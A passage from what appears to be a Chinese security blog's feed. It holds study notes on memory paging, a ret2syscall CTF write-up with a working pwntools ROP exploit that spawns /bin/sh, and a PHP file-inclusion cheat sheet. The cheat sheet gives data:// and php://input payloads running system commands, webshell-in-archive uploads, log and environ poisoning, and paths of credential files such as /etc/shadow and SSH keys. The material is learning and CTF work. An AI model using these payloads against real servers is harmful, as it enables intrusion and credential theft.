“虚拟地址”，达到一种间接访问物理地址的方法。思路是这样的：使用<strong>某些映射方法来控制由虚拟地址到物理地址的映射</strong>过程。那么只要我们妥善控制了这个映射的方法，就能保证每一个程序之间的隔离效果。</p><h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><blockquote><p>首先附上汇编之前学过的知识：</p><p>十六进制0x串转为二进制 ：将每个位对应写成4位二进制形式</p></blockquote><p>贴上分段范例的示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E6%AE%B5.png" alt></p><p>上图使用的例子大概意思是： 现在有某个程序A，大小为10MB(计算：0xA00000 即是0xA个0x100000 。 其中的0x100000即是2^20个bit 即是1M。0xA个即是有10个1MB。那么就是程序A的大小为10MB)。它在虚拟地址中分配一段由0x00000000到0x00A00000的虚拟空间。 随后我们在物理地址空间里面的分配对应的相同大小的空间，假设这段空间由0x00100000到0x00B00000。<strong>虚拟空间里面的每个字节对应着物理空间里面的每个字节</strong>。那么当程序A里面访问到地址0x00001000的时候，CPU就会将这个地址转为真实的物理地址0x00101000。程序B也是同理。</p><p>假如当程序A访问虚拟地址超出了0x00A00000，就会被判断为非法访问并拒绝访问，这样就能避免程序覆盖了其他程序到导致错误。另一方面，程序不用关心它会被分配到真实物理空间的哪一区域，它只要按照自己程序的虚拟空间0x00000000到0x00A0000来编写程序和放置变量即可。</p><p>所以使用这种分段式方法基本解决了不隔离和地址不确定两个问题。我们得继续探讨如何处理效率低下的问题</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>首先贴出分页的范例示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E9%A1%B5.png" alt></p><p>我们首先规定一些概念：</p><ul><li>虚拟空间的页叫做”<strong>虚拟页</strong>“（Virtual Page，简称VP）</li><li>物理内存的页叫做”<strong>物理页</strong>“ （Physical Page，简称PP）</li><li>磁盘中的页叫做”<strong>磁盘页</strong>“ （Disk Page，简称DP）</li></ul><p>然后我们对上图进行分析：</p><p>进程1中的虚拟页VP0、VP1和VP7映射到了物理页PP0、PP2和PP3上面；然后进程1中有部分虚拟页位于磁盘页中，即VP2、VP3分别位于磁盘中的DP0和DP1；进程1中剩下的虚拟页VP4-VP6可能因为还没调用或者被访问到，处于未访问的状态。</p><p>VP2、VP3没有位于物理内存中，当进程需要调用到VP2和VP3的时候，硬件就会捕捉到这个消息 ：”页错误”。然后<strong>操作系统就会接管进程</strong>负责从磁盘中将VP2和VP3读入到内存中，然后再将内存中的这两个PP和虚拟页中的VP2、VP3<strong>建立映射关系</strong>。</p><p>这样分页就达成了提高效率的目的</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程的简单定义是：<strong>轻量级进程</strong>，线程是程序执行流程的最小单元。</p><p>线程具有三种基本状态：就绪 、运行 、等待</p><p>今天先写到这里吧。。。后面继续补上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day1&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day1&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day1&quot;&gt;&lt;/a&gt;程序员的自我修养 Day1&lt;/h1&gt;&lt;p&gt;静下心来好好研究计算机底层的实现，为二进制安全的研究
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2syscall</title>
    <link href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/"/>
    <id>http://bai-ren-1.github.io/2019/12/06/ret2syscall/</id>
    <published>2019-12-06T08:23:27.000Z</published>
    <updated>2019-12-07T04:31:35.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p><p>先附上有点模糊了的知识：</p><p>1、x86下 ip 调用指令的过程：</p><blockquote><p>1、从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p><p>2、ip += 所读指令的长度，从而指向下一条指令；</p><p>3、执行指令，然后返回第一步</p></blockquote><p>2、入栈 push 操作的本质：（pop就是反过来）</p><blockquote><p>1、esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p><p>2、将数据传入这个新的栈顶单元</p></blockquote><p>3、call 和 ret 的原理</p><blockquote><p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p><p>2、ret ：pop ip （栈顶出栈给 ip，让ip继续执行之前指令后面的指令） </p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><p>贴上wiki上面关于syscall的解释：</p><blockquote><p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p><p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p></blockquote><p><img src="/2019/12/06/ret2syscall/syscall.png" alt></p><p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p><blockquote><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）；</li></ol></blockquote><p>同时附上操作系统实现系统调用的过程：</p><blockquote><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序。</li></ol></blockquote><p>现在知道了通过 int 80h 我们就能在程序中调用系统调用，这里附上 Linux 系统调用表：</p><table><thead><tr><th>%eax</th><th>系统调用名</th><th>源代码</th><th>%ebx</th><th>%ecx</th><th>%edx</th><th>%esx</th><th>通过堆栈</th></tr></thead><tbody><tr><td>1</td><td>sys_exit</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>sys_fork</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>sys_read</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>4</td><td>sys_write</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>5</td><td>sys_open</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td>sys_close</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>sys_waitpid</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td>sys_creat</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>sys_link</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>sys_unlink</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>sys_execve</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>sys_chdir</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>sys_time</td><td><a href="file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>sys_mknod</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td>-</td><td>-</td></tr><tr><td>15</td><td>sys_chmod</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>sys_lchown</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>18</td><td>sys_stat</td><td><a href="file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td>sys_lseek</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#off_t" target="_blank" rel="noopener">off_t</a></td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td>sys_getpid</td><td><a href="file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用 ctf-wiki 上面的 ret2syscall（在我本地的文件名为 pwn） ，基本信息就直接说了。下面是 main 的代码，还是 gets 栈溢出然后控制程序执行。通过 cyclic 可以得到栈溢出到返回地址的偏移地址是112；然后程序是32位，开启了NX保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在原程序里面是找不到系统命令直接可以 ret 的，于是我们得使用到syscall。</p><p>在这里我们决定构成下面这个系统调用： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">'/bin/sh'</span>);</span><br></pre></td></tr></table></figure><p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p><p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p><p><img src="/2019/12/06/ret2syscall/ret2syscall-1.png" alt></p><p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p><p>然后我们继续寻找 ebx :</p><p><img src="/2019/12/06/ret2syscall/syscall-2.png" alt></p><p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p><p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p><p><img src="/2019/12/06/ret2syscall/syscall-3.png" alt></p><p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p><p><img src="/2019/12/06/ret2syscall/syscall-4.png" alt></p><p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>下面用详细大白话解释exp：</p><blockquote><p>112个 a 控制溢出到返回地址，我们设置返回地址为 pop_eax 操作的地址。当 ip 运行到这个地址返回时，就会跳去执行 pop eax 的操作了；同时 esp 在读完这个返回地址后继续往下，指向 0xb 这个数据单元。在 ip 读完 pop eax 指令，就会把当前栈顶的值赋值给 eax，也就是把 0xb 赋值给 eax ，那么我们的第一步目的就达成了。</p><p>然后在栈弹给值 0xb 给 eax 后，栈指针继续往下走指向了 ebx 那一串 pop 指令所在地址，同时ip 会继续走到了执行 ret 的那条指令的位置（ pop eax 后的 ret 操作）。 ret 本质（模糊知识点起作用了）就是把当前栈指向的地址（也就是 ebx 的那一串 pop 指令的地址）返回给 ip 。然后 ip 就会傻傻的跑去执行那一串 pop 操作了，esp也傻傻的继续往下走（指向了payload中的第一个0） 。</p><p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p></blockquote><p>至此 rop 链构建成功，成功getshell。</p><p><img src="/2019/12/06/ret2syscall/shell.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h1&gt;&lt;p&gt;大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2019-11-30T12:49:42.000Z</published>
    <updated>2019-12-05T12:02:23.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了</p><p> PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>类型的包含文件时即使遇到错误，下面代码会依然执行</span><br><span class="line"><span class="keyword">include</span>()：</span><br><span class="line"><span class="keyword">include_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br><span class="line">    </span><br><span class="line"><span class="keyword">require</span>类型的包含文件时遇到错误直接退出</span><br><span class="line"><span class="keyword">require</span>()：</span><br><span class="line"><span class="keyword">require_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br></pre></td></tr></table></figure><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul><li><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p><blockquote><p>allow_url_include = On;</p><p>allow_url_fopen 无要求;</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p><blockquote><p>无要求；</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><blockquote><p>php版本 &gt;= 5.3.0</p></blockquote></li></ul><p>  范例：</p><p>  场景一：文件限定支持上传 zip 等压缩包格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写<code>&lt;?php phpinfo(); ?&gt;</code> 的读取 phpinfo 的 txt (这里也可以直接写一句话木马 shabi.php )。然后添加到压缩包 test.zip 里面并且成功上传，然后通过 phar 就能读出压缩包里面的txt文件并且使其能被执行：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.zip/phpinfo.txt</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure><p>  场景二：文件限定支持上传 jpg 等图片格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写一句话木马 shabi.php ，然后添加到压缩包 test.zip 里面，并且将 test.zip 改名为 test.jpg ，这样就能成功上传并且能通过 phar 读出压缩包里面的一句话木马并且执行：‘</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.jpg/shabi.php</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.jpg/shabi.php</span></span><br></pre></td></tr></table></figure><hr><ul><li><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件</p><blockquote><p>php版本 &gt;= 5.3.0</p><p>需要指定绝对路径</p><p>构造压缩包的方法等同于phar</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//E:/phpStudy/WWW/test.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的 %23 是 # 的url编码</p></blockquote></li></ul><hr><ul><li><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>利用条件</p><blockquote><p>php版本大于等于php5.2</p><p>allow_url_fopen = On</p><p>allow_url_include = On</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">接收文本执行命令：</span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">接收base64编码文件执行命令:</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b </span><br><span class="line"></span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>%2b 是 + 的url编码，解码后PD9waHAgcGhwaW5mbygpOz8+这串base64串解码后是</p><p> <code>&lt;?php phpinfo();  ?&gt;</code></p><p>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 这串base64串解码后是</p><p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p></blockquote></li></ul><hr><h2 id="日志包含getshell"><a href="#日志包含getshell" class="headerlink" title="日志包含getshell"></a>日志包含getshell</h2><p>当存在文件包含漏洞的时候，我们往往可以通过污染日志并且包含来getshell。</p><p>污染日志的原理就是通过访问一个错误的请求让日志记录下这条记录，我们在访问错误记录时使用代码进行请求，然后再通过文件包含包含出来，就能达到执行的目的了：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E4%BE%8B%E5%AD%90.png" alt></p><p>标上红标的地方改为一句话木马，然后包含出来就能getshell了。</p><blockquote><p>因为浏览器的编码问题，污染日志的一句话可能被自动加上url编码导致包含时会失效。</p><p>解决方法：1、用bp改回参数；2、用curl命令发请求</p></blockquote><p>附上各种能污染的WEB日志的路径：</p><h3 id="Apache日志："><a href="#Apache日志：" class="headerlink" title="Apache日志："></a>Apache日志：</h3><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，error.log的默认路径是在在</p><ul><li>/var/log/apache2/error.log</li></ul><p>下面是其他一般日志的路径</p><ul><li>/var/log/apache/access_log</li><li>/var/www/logs/access_log</li><li>/var/log/access_log</li><li>/var/log/apache2/access.log </li></ul><hr><h3 id="SSH日志："><a href="#SSH日志：" class="headerlink" title="SSH日志："></a>SSH日志：</h3><p>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure><p>然后提示密码输入，随意输入就会登录失败。</p><p>之后在 remotehost 的 ssh-log 中就会出现刚刚登录的php代码，对 ssh-log包含即可执行。</p><hr><h2 id="environ包含getshell"><a href="#environ包含getshell" class="headerlink" title="environ包含getshell"></a>environ包含getshell</h2><p>利用条件：</p><blockquote><p>php以cgi方式运行，这样environ才会保持UA头。</p><p>environ文件存储位置已知，且environ文件可读。</p></blockquote><p>/proc/self/environ： Linux下的当前正在运行的进程的环境变量列表 ，访问能看到里面会有http请求头的信息。于是我们可以通过 user-agent变量进行代码注入，然后通过文件包含来读取并执行代码。</p><p>范例：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/user-agent%E6%B3%A8%E5%85%A5.png" alt></p><blockquote><p>上面例子是反弹了一个shell，我们也可以注普通的一句话</p></blockquote><hr><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>session 文件格式为 sess_[phpsessid] , phpsessid 作为cookie传递，在服务端文件位置会变化</p><p>默认路径是：</p><ul><li>/tmp/(PHP Sessions)</li></ul><p>也可能位于下面路径：</p><ul><li>/var/lib/php/session/(PHP Sessions)</li><li>/var/lib/php5/(PHP Sessions)</li><li>c:/windows/temp/(PHP Sessions)等文件中</li></ul><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇因为期末写了好多天，哎，长路漫漫，漫漫奋斗</p><p>附上敏感文件：</p><p>Linux下：</p><p> ssh免密码登录的秘钥文件等 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys </span><br><span class="line">/root/.ssh/id_rsa </span><br><span class="line">/root/.ssh/id_rsa.keystore </span><br><span class="line">/root/.ssh/id_rsa.pub </span><br><span class="line">/root/.ssh/known_hosts</span><br></pre></td></tr></table></figure><p>加密后的用户口令位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 历史命令 </span><br><span class="line">/root/.bash_history /root/.mysql_history</span><br></pre></td></tr></table></figure><p>进程文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br></pre></td></tr></table></figure><p>检查已经被系统挂载的设备 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts</span><br></pre></td></tr></table></figure><p>机器的内核配置文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure><p>window下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:/boot.ini  //查看系统版本  </span><br><span class="line">C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件  </span><br><span class="line">C:/Windows/repairsam  //存储系统初次安装的密码  </span><br><span class="line">C:/Program Files/mysqlmy.ini  //Mysql配置  </span><br><span class="line">C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root  </span><br><span class="line">C:/Windows/php.ini  //php配置信息  </span><br><span class="line">C:/Windows/my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure>]]></content>
    
